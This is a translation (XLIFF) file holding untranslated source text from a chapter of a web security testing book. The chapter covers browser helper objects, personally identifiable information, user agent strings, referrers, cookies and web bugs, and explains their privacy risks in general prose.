        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Browser Helper Objects</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Browser helper objects (BHOs) provide a mechanism for Web developers to extend the functionality of the browser. They allow tight integration with the browser so that a user may consider the BHO functionality as part of the browser. This is their exact appeal: seamlessly adding features (like a Search toolbar) to customize the browser to a certain end-user purpose.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>But anything that is capable of adding useful functionality is also capable of being abused. BHOs are no exception. You can use them to modify the contents of a rendered page (which might aid phishing attacks), detect user keystrokes (which could benefit spyware), and monitor traffic to and from the browser (which could easily be used for identity theft). They are by far the preferred delivery mechanism for spyware, although not all BHOs are malicious. (The Google toolbar is an example of a benign BHO.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>BHOs are implemented as DLLs and put on the client machine. Thus, they are similar to ActiveX controls, and the same warning about them applies. BHODemon (&lt;a class="docLink" target="_blank" href="http://www.definitivesolutions.com/bhodemon.htm"&gt;http://www.definitivesolutions.com/bhodemon.htm&lt;/a&gt;) is a free tool that lists and removes browser helper objects, although much of this functionality has been included in Internet Explorer 6 SP2.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec9.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch09lev1sec2.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Online privacy has been a hot topic of late. Never before has so much &lt;span class="docEmphStrong"&gt;personally identifiable information&lt;/span&gt; (PII) been stored on so many servers all over the planet. Social security numbers, credit card numbers, medical records, and information about our buying patterns and the merchandise we have purchased is everywhere. There are many good reasons to keep this information as private as possible.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In the past, most PII was part of an individual's personal record, and it traveled mainly through channels (such as the U.S. Mail) that the government owned. Now, however, the World Wide Web serves as the transit vehicle for a great deal of PII, which means that it is fairly likely that during your professional career you will be part of a development team that will have to worry about handling PII.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>PII comes in many forms and varies depending on the application. However, the following are general categories and examples of PII that you may come into contact with as a Web developer or tester:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;Personal user information&amp;mdash;&lt;/span&gt; This includes names, e-mail addresses, phone numbers, mailing addresses, images, or anything that can be used to identify users or their locations.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.span.text">
          <source>Sensitive user information&amp;mdash;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>This includes logins/usernames, password information, and security question answers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;Users' financial information&amp;mdash;&lt;/span&gt; This includes credit card numbers, account numbers, financial history, balances, or spending preferences.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;Statistical information&amp;mdash;&lt;/span&gt; This includes browsing habits, favorite pages, online shopping habits, and product preferences.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>We want to go to great pains to protect such information in our Web applications so that our users can avoid problems ranging from identity theft to personal embarrassment. There are also laws that govern the management of medical information and other such sensitive data. Loss of such data can be a violation of those laws. As Web developers, we have to be aware of these situations by understanding what PII our application may store and testing that proper protection measures are in place.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This chapter deviates from the attack-based methodology of previous chapters to describe many of the features of Web applications that an attacker can abuse. It is information that everyone involved in Web development or testing (or just plain browsing) should be aware of, but there is little that can be done from the Web application point of view because privacy often becomes an issue managed by the underlying platform of operating system and Web browser.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch09lev1sec3.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>User Agents</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>User Agents</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Many different Web browsers are on the market, and each of them renders HTML and associated scripts slightly differently. This variety obviously makes Web development more difficult because developers have to customize the delivery of Web content for every supported browser.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>How does the Web server or Web application identify the type of browser that has requested content? Well, each browser identifies itself with a &lt;span class="docEmphStrong"&gt;user agent string&lt;/span&gt;. This descriptor string is passed with the rest of the HTTP headers from the client machine to the server to identify the type of browser and any other information about the machine that might be useful in rendering content, such as the version of media players, animation engines, and so forth. The Web application can then decide how to manage the downloading of content to the client browser. Well, each browser identifies itself with a user agent string, as highlighted in &lt;a class="docLink" href="#ch09fig01"&gt;Figure 9-1&lt;/a&gt; (for Internet Explorer) and &lt;a class="docLink" href="#ch09fig02"&gt;Figure 9-2&lt;/a&gt; (for Firefox).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 9-1. IE user agent string.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 9-2. Firefox user agent string.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>As you can see, there's a lot of information regarding the browser contained in the user agent string. Breaking it down, here's what a server can discover about a client.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>For more information, see &lt;a class="docLink" target="_blank" href="http://www.mozilla.org/build/revised-user-agent-strings.html"&gt;http://www.mozilla.org/build/revised-user-agent-strings.html&lt;/a&gt; for Firefox, or &lt;a class="docLink" target="_blank" href="http://msdn.microsoft.com/library/?url=/workshop/author/dhtml/overview/aboutuseragent.asp"&gt;http://msdn.microsoft.com/library/?url=/workshop/author/dhtml/overview/aboutuseragent.asp&lt;/a&gt; for Internet Explorer.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 9-3. Differences in user agent strings.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>All this detail can help an application decide what type of content to send to a browser. Most large companies with complex, highly dynamic sites serve different content depending on the browser so that they can overcome the difference in versions, scripting capabilities, and adherence to standards. This makes the user agent string an important part of connecting a Web client to a Web server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The biggest collection of user agent string we could find is on &lt;a class="docLink" target="_blank" href="http://www.zytrax.com/tech/Web/browser_ids.htm"&gt;http://www.zytrax.com/tech/Web/browser_ids.htm&lt;/a&gt;. As with all &amp;quot;good&amp;quot; functionality, though, an attacker can put it to malevolent use.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Consider a malicious Web site that has lots of vulnerabilities for different browsers. Unfortunately, vulnerabilities are not that uncommon. Internet Explorer 6 has 86 known vulnerabilities within the period 2003&amp;ndash; 2005, 29% of which are unpatched at the time of this writing (&lt;a class="docLink" target="_blank" href="http://secunia.com/product/11/"&gt;http://secunia.com/product/11/&lt;/a&gt;). Firefox fares slightly better with 24 vulnerabilities (but only over the course of one year&amp;mdash;2004&amp;ndash;2005), with 13% unpatched. But the numbers get worse when you consider that not every user patches his machine.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The user agent string helps a malicious server discover the patch level of a visiting browser and deliver an exploit that is tailored for that particular visitor.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Because the user agent string originates from a client-side program, like a Web browser, it is at the mercy of the user. There is nothing to prevent a user from changing the string to fool a Web server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Certain tools identify themselves using nonstandard user agent strings, as do automated Web crawlers. Developers who do not want certain pages included in the data gathered by a particular crawler or want to ensure that crawlers do not eat up too much bandwidth can disallow connections to any user agent identifying itself as an automated tool.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch09lev1sec4.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Referrer</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec3.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Referrer</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The &lt;span class="docEmphStrong"&gt;Referer&lt;/span&gt; (sic)&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch09fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; is part of the HTTP request that the browser sends to the Web server. It identifies the previous Web page from which a link was followed to the current requested URL (see &lt;a class="docLink" href="#ch09fig04"&gt;Figure 9-4&lt;/a&gt;). For example, if you click on a link in a search engine results page, the URL of the search engine is passed to the requested page as the location from which the user was referred to the current URL. Note that if you type (or copy/paste) a URL directly into the browser field, a referrer tag is not generated.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch09fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; Note the correct spelling of Referrer compared to the spelling that appears in many Web standards, Referer. Unfortunately, this error is still with us, and you'll see the word spelled both ways depending on the source of information. We'll spell it the correct way henceforth in this book, but beware of the difference.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 9-4. The referer header identifies how a user arrived at a page they are requesting.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Many Web applications log referrers, allowing them to track visitors to their site. This practice has obvious privacy implications, and some browsers allow the user to disable the functionality. Also, many firewalls and proxies filter referrer information.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Perhaps the main functionality that the referrer tag provides to the Web developer is the ability to know the last page visited by a user when he submits a page request. This is particularly useful when we must enforce a specific page sequence for visitors to our site. The typical example is that users must visit a login page before being allowed to view pages with protected content. Developers might check the referrer page for protected content by comparing the value to Referer&amp;mdash;&lt;a class="docLink" target="_blank" href="http://www.somewebsite.com/login.cgi"&gt;www.somewebsite.com/login.cgi&lt;/a&gt;&amp;mdash;and failing to load the page if the referrer is any other page. (See &lt;a class="docLink" href="ch04.html#ch04"&gt;Chapter 4&lt;/a&gt;, &amp;quot;State-Based Attacks.&amp;quot;) However, Web proxy programs make it trivial to find the referrer page because browsers take no pains to protect it. This form of page referral is anything but secure.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Another practice known as &lt;span class="docEmphStrong"&gt;referrer spam&lt;/span&gt; is accomplished by making bogus page requests to targeted Web sites for the sole purpose of filling their logs with specific referrer sites. This practice is mostly used to artificially inflate the importance of a Web site to increase its ranking for search engines. Some order links based on how popular they are in terms of &lt;span class="docEmphStrong"&gt;click-through&lt;/span&gt;. What some people will do to make their sites artificially seem more popular!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec3.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch09lev1sec5.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Cookies</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec4.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Cookies</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Cookies have been discussed at length throughout this book, but a short refresher is in order to set the context for discussing their privacy implications.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Cookies are packets of information that a Web application sends to a client browser. Their name (full name: HTTP Magic Cookies) originally came from the way old UNIX terminal systems handled video attribute changes and later identified individual users of x-window screens&amp;mdash;much like we use HTTP cookies for sessions today.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Cookies are stored as files on the hard drive of the client computer and are read by the Web application on subsequent visits by the client. Their main use is to remember information so that the user doesn't have to re-enter it every time he visits the site. In other words, cookies are a mechanism to provide state information to an otherwise stateless HTTP transaction.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Cookies typically contain user account information, customization, and personalization options, and the contents of Web shopping carts. Clearly, cookies could contain information that a user would not want divulged to just any Web site.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Every browser has its own location to store cookies and rules for how cookies are managed. Thus, cookies don't really identify a person, but &lt;a name="iddle1219"&gt;&lt;/a&gt;instead a browser/computer combination. Most browsers also give the option of limiting and restricting how cookies are managed. Because cookies are files, a user can delete them anytime he wants.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Because cookies can contain PII, they are a target for attackers who attempt to read site-specific cookies for the purpose of session hijacking or identify theft (usually through cross-site scripting). Attackers can also use cookies (like the referrer tag) to track where people have been in the Web.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Take a look at the cookies that are installed on your machine (in &lt;tt&gt;c:\documents and setting\[username]\cookies&lt;/tt&gt; for Internet Explorer, or via the menus Internet Options, Privacy, Cookies, View Cookies in Firefox). Do you see cookies from doubleclick.net? It's probably a site that you've never been to, but its cookies end up on many users' machines.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 9-5. Viewing stored cookies.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&lt;a class="docLink" target="_blank" href="http://DoubleClick.net"&gt;DoubleClick.net&lt;/a&gt; is an online advertising/marketing agency that places advertisements on other sites. When a user visits a page that contains such an advertisement, the browser automatically goes off and requests the contents of the ad from DoubleClick.net's site&amp;mdash;much like images are automatically downloaded. Now, because the Web is stateless, and each request is independent of all others, gathering this one advertisement for inclusion in another page is like requesting the page itself, allowing DoubleClick to set and read existing cookies. Because each ad that was placed has a unique identifier, &lt;a class="docLink" target="_blank" href="http://DoubleClick.net"&gt;DoubleClick.net&lt;/a&gt; knows when (and where) each advertisement was viewed.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Mostly, this use of cookies is benign. It tracks which advertisements users have seen and avoids delivering the same advertisement ad nauseum. However, given enough pages, linking to a central third-party site, this mechanism can track which pages you've visited and how often.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec4.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch09lev1sec6.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Web Bugs</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec5.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Web Bugs</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Web bugs are single-pixel images represented by the HTML IMG tag that are embedded in a Web site. Because these images are often single-pixel transparent images, they are invisible to the user. You can find them by searching the HTML source downloaded from the visited site.</source>
          <target></target>
        </trans-unit>
